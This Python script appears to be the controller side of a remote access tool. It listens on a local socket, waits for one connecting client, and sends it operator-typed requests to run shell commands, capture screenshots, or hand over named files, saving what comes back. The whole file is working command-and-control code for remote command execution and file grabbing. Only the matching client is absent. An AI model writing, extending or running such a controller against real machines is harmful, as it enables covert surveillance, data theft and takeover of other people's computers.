import socket
import json
import struct


# command
def get_command_input(request):
    command = input("Please enter the wanted command: ")
    request["command"] = command
    return request

def print_command_output(response, request=None):
    print(f"Received response:\n {response.decode('utf-8')}")


#file
def get_file_name(request):
    name = input("Please enter the wanted file name: ")
    request["file_name"] = name
    return request

def handle_file(response, request=None):
    filename = request.get("file_name", "grabbed_file") if request else "grabbed_file"
    with open(filename, "wb") as f:
        f.write(response)
    print(f"File saved as {filename}")


#screenshot
def get_screenshot_input(request):
    return request

def handle_screenshot(response, request=None):
    with open('received_screenshot.png', 'wb') as f:
        f.write(response)
    print("Screenshot saved.")


actions = {
    "command": {
        "input": get_command_input,
        "output": print_command_output
    },
    "screenshot": {
        "input": get_screenshot_input,
        "output": handle_screenshot
    },
    "file": {
        "input": get_file_name,
        "output": handle_file
    }
}


def get_user_input():
    request = {
    }
    action = input("Please enter the wanted action (command/screenshot/file): ")
    request["type"] = action
    if action in actions:
        actions[action]["input"](request)

    return request


def receive_all(sock, size):
    data = b''
    while len(data) < size:
        part = sock.recv(size - len(data))
        if not part:
            raise ConnectionError("Socket closed before all data received.")
        data += part
    return data



def main():
    # Create server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("127.0.0.1", 2000))
    server_socket.listen()
    print("Server listening on 127.0.0.1:2000")

    try:
        # Accept client connection
        client_socket, addr = server_socket.accept()
        print(f"Connected to client: {addr}")

        while True:
            # Get and send command
            request = get_user_input()
            if not request:
                print("No valid command provided. Closing connection.")
                break
            request_bytes = json.dumps(request).encode('utf-8')
            length = struct.pack(">I", len(request_bytes))
            client_socket.send(length + request_bytes)

            print(f"Sent command: {request}")

            length_bytes = receive_all(client_socket, 4)
            print(length_bytes)
            if len(length_bytes) < 4:
                # Handle disconnection or error
                # For example, break or close sockets
                pass

            size = struct.unpack(">I", length_bytes)[0]
            # Receive response from client
            response = receive_all(client_socket, size)
            if request["type"] in actions:
                actions[request["type"]]["output"](response, request)

    except Exception as e:
        print(f"Error: {e}")
    finally:
        server_socket.close()
        print("Sockets closed.")


if __name__ == "__main__":
    main()
